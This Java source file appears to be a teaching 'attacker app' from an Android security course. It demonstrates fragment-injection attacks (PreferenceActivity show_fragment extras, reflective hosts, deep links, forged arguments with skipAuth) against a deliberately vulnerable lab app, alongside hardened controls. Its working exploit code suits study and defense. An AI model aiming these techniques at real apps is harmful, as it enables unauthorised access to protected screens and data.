// examples/attacker-app/InjectActivity.java
//
// AUTHORISED TESTING ONLY. Attacks the chapter 31 victim app, on a device you
// own. Every target is hard coded to com.pentest.ch31.victim.
//
// WHY THIS EXISTS AS AN APP AND NOT AS `adb shell am start`
//
// `adb shell` runs as uid 2000 (`shell`), which holds 200 permissions the
// victim's neighbours do not -- this repository measures that in chapter 60,
// and chapters 37, 39, 48, 63 and 64 all hit the same trap from other angles.
// A result obtained from `adb shell` tells you what SHELL can do. The question
// a report has to answer is what an ORDINARY APP can do. So this attacker is an
// ordinary app: no permissions, no root, uid 10xxx.
//
// You can still drive it from the shell -- the shell starts THIS app, and this
// app makes the call that matters:
//
//   adb shell am start -n com.pentest.ch31.attacker/.InjectActivity \
//       --es attack pref-inject
//
// ATTACKS
//
//   pref-inject          [V1] PreferenceActivity + :android:show_fragment
//   pref-hardened        [H1] the same Intent against the allowlisted Activity
//   pref-legacy          [V3] the same Intent against a subclass with no
//                             isValidFragment override at all
//   host-inject          [V2] reflective host + a class name in an extra
//   host-hardened        [H2] the same idea against the closed key map
//   host-deeplink        [V2] the same sink reached through a ch31victim:// URI
//   args                 [V2] injection PLUS an attacker built arguments Bundle
//   type-platform        [V2] point the PLATFORM loader at a non Fragment class
//   type-erasure         [V2] point the ERASURE ordering at the same class
//   probe                start nothing; just report what is visible
//   ctf                  labs/lab-05 stage two: inject VaultFragment with an
//                        unlock value you supply:
//                          --es attack ctf --es unlock <value you found on screen>

package com.pentest.ch31.attacker;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

public class InjectActivity extends Activity {

    private static final String TAG = "CH31ATK";

    private static final String VICTIM = "com.pentest.ch31.victim";
    private static final String VULN_PREF = VICTIM + ".SettingsActivity";
    private static final String SAFE_PREF = VICTIM + ".SettingsHardenedActivity";
    private static final String LEGACY_PREF = VICTIM + ".LegacySettingsActivity";
    private static final String VULN_HOST = VICTIM + ".FragmentHostActivity";
    private static final String SAFE_HOST = VICTIM + ".FragmentHostHardened";

    private static final String TARGET_FRAGMENT = VICTIM + ".AdminFragment";
    private static final String PUBLIC_FRAGMENT = VICTIM + ".PublicFragment";
    private static final String NOT_A_FRAGMENT = VICTIM + ".NotAFragment";
    private static final String VAULT_FRAGMENT = VICTIM + ".VaultFragment";

    // The two platform extras. They are ordinary public constants on
    // PreferenceActivity (EXTRA_SHOW_FRAGMENT and EXTRA_SHOW_FRAGMENT_ARGUMENTS);
    // the literal strings are written out here so the attack is legible without
    // looking anything up, and so this file compiles against any android.jar.
    private static final String EXTRA_SHOW_FRAGMENT = ":android:show_fragment";
    private static final String EXTRA_SHOW_FRAGMENT_ARGUMENTS = ":android:show_fragment_args";

    private TextView mLog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        buildUi();

        String attack = getIntent().getStringExtra("attack");
        if (attack != null) {
            run(attack);
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        // Keep getIntent() in step. Chapter 30 section 3.1 explains why this
        // line is not optional and why forgetting it is its own bug class.
        setIntent(intent);
        String attack = intent.getStringExtra("attack");
        if (attack != null) {
            run(attack);
        }
    }

    // ------------------------------------------------------------------ //

    private void run(String attack) {
        say("=== " + attack + " ===");
        try {
            switch (attack) {
                case "pref-inject":   prefInject(VULN_PREF); break;
                case "pref-hardened": prefInject(SAFE_PREF); break;
                case "pref-legacy":   prefInject(LEGACY_PREF); break;
                case "host-inject":   hostInject(VULN_HOST, TARGET_FRAGMENT, null, null); break;
                case "host-hardened": hostHardened(); break;
                case "host-deeplink": hostDeepLink(); break;
                case "args":          argsInject(); break;
                case "type-platform": hostInject(VULN_HOST, NOT_A_FRAGMENT, null, "platform"); break;
                case "type-erasure":  hostInject(VULN_HOST, NOT_A_FRAGMENT, null, "erasure"); break;
                case "control":       hostInject(VULN_HOST, PUBLIC_FRAGMENT, null, null); break;
                case "ctf":           ctf(); break;
                case "probe":         probe(); break;
                default:              say("unknown attack: " + attack);
            }
        } catch (Exception e) {
            say("FAILED: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            Log.e(TAG, "attack " + attack + " failed", e);
        }
    }

    /**
     * [V1] The classic. Two extras, one startActivity, no permissions.
     *
     * Nothing here is clever. The extras are public API constants; the target
     * is an exported Activity; the Fragment name is a string. What makes it an
     * attack is that AdminFragment is not a screen this Activity has any
     * business showing, and the victim never checks.
     */
    private void prefInject(String activity) {
        Intent i = new Intent();
        i.setComponent(new ComponentName(VICTIM, activity));
        i.putExtra(EXTRA_SHOW_FRAGMENT, TARGET_FRAGMENT);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
        say("started " + activity);
        say("  " + EXTRA_SHOW_FRAGMENT + " = " + TARGET_FRAGMENT);
        say("watch: adb logcat -s CH31");
    }

    /** [V2] The same idea against a hand written reflective host. */
    private void hostInject(String activity, String fragment, Bundle args, String mode) {
        Intent i = new Intent();
        i.setComponent(new ComponentName(VICTIM, activity));
        i.putExtra("fragment", fragment);
        if (args != null) {
            i.putExtra("args", args);
        }
        if (mode != null) {
            i.putExtra("mode", mode);
        }
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
        say("started " + activity);
        say("  fragment = " + fragment);
        if (mode != null) {
            say("  mode     = " + mode);
        }
    }

    /** [H2] The control: the closed key map should refuse both of these. */
    private void hostHardened() {
        Intent i = new Intent();
        i.setComponent(new ComponentName(VICTIM, SAFE_HOST));
        i.putExtra("screen", TARGET_FRAGMENT);   // a class name, not a key
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
        say("started " + SAFE_HOST + " with screen=" + TARGET_FRAGMENT);
        say("expect: 'refused' in logcat, and the Activity finishing");
    }

    /**
     * [V2] The same sink through the deep link. This is the version that has no
     * "attacker app must be installed" precondition at all, because a web page
     * can emit the URI. Chapter 26 section 3.11 owns deep link verification.
     */
    private void hostDeepLink() {
        Uri u = Uri.parse("ch31victim://screen/open?f=" + TARGET_FRAGMENT);
        Intent i = new Intent(Intent.ACTION_VIEW, u);
        i.addCategory(Intent.CATEGORY_BROWSABLE);
        i.setPackage(VICTIM);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
        say("started deep link " + u);
    }

    /**
     * Injection plus arguments. The Bundle reaches the Fragment's
     * getArguments() untouched, so the injected Fragment is not merely
     * constructed -- it is constructed with attacker chosen inputs. Any
     * Fragment that trusts its own arguments (most of them do, because
     * "arguments come from my own code") is now taking them from a stranger.
     */
    private void argsInject() {
        Bundle args = new Bundle();
        args.putString("note", "attacker-supplied argument");
        args.putBoolean("skipAuth", true);
        args.putInt("accountId", 1);

        // Same Bundle, both flavours of host, so the labs can compare.
        Intent i = new Intent();
        i.setComponent(new ComponentName(VICTIM, VULN_PREF));
        i.putExtra(EXTRA_SHOW_FRAGMENT, TARGET_FRAGMENT);
        i.putExtra(EXTRA_SHOW_FRAGMENT_ARGUMENTS, args);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
        say("started " + VULN_PREF + " with an attacker built arguments Bundle");
        say("  keys: " + new java.util.ArrayList<String>(args.keySet()));
    }

    /**
     * labs/lab-05 stage two. Injects VaultFragment through the reflective host,
     * carrying an arguments Bundle whose "unlock" value comes from the Intent
     * that started THIS app -- so the player supplies it, rather than it being
     * baked in. The target package is still hard coded.
     */
    private void ctf() {
        String unlock = getIntent().getStringExtra("unlock");
        if (unlock == null) {
            say("no unlock value supplied.");
            say("usage: --es attack ctf --es unlock <value>");
            say("The value is rendered on the victim's screen by AdminFragment");
            say("and appears in NO log. That is the point; see README section 5.7.");
            return;
        }
        Bundle args = new Bundle();
        args.putString("unlock", unlock);
        hostInject(VULN_HOST, VAULT_FRAGMENT, args, null);
        say("  unlock   = " + unlock);
        say("watch: adb logcat -s CH31");
    }

    /**
     * What can an ordinary app SEE about the victim before attacking it? This
     * is the reconnaissance an attacker actually has, and it is much less than
     * a tester with an APK in a decompiler.
     */
    private void probe() {
        PackageManager pm = getPackageManager();
        try {
            PackageInfo pi = pm.getPackageInfo(VICTIM, PackageManager.GET_ACTIVITIES);
            say("victim versionName=" + pi.versionName);
            if (pi.activities == null) {
                say("no activities visible");
                return;
            }
            for (ActivityInfo ai : pi.activities) {
                say((ai.exported ? "EXPORTED  " : "internal  ") + ai.name
                        + (ai.permission != null ? "  perm=" + ai.permission : ""));
            }
        } catch (PackageManager.NameNotFoundException e) {
            say("victim not installed, or hidden by package visibility.");
            say("Check the queries element in this app's manifest.");
        }
    }

    // ------------------------------------------------------------------ //

    private void buildUi() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(32, 64, 32, 32);
        root.setBackgroundColor(Color.parseColor("#FFEBEE"));

        TextView h = new TextView(this);
        h.setTextColor(Color.BLACK);
        h.setText("CH31 attacker. Zero permissions. Targets com.pentest.ch31.victim only.");
        root.addView(h);

        String[] attacks = {
                "probe", "control", "pref-inject", "pref-hardened", "pref-legacy",
                "host-inject", "host-hardened", "host-deeplink",
                "args", "type-platform", "type-erasure", "ctf"
        };
        for (final String a : attacks) {
            Button b = new Button(this);
            b.setText(a);
            b.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    run(a);
                }
            });
            root.addView(b);
        }

        mLog = new TextView(this);
        mLog.setTextColor(Color.BLACK);
        mLog.setTextSize(12f);
        root.addView(mLog);

        ScrollView sv = new ScrollView(this);
        sv.addView(root);
        setContentView(sv);
    }

    private void say(String s) {
        Log.i(TAG, s);
        if (mLog != null) {
            mLog.append(s + "\n");
        }
    }
}
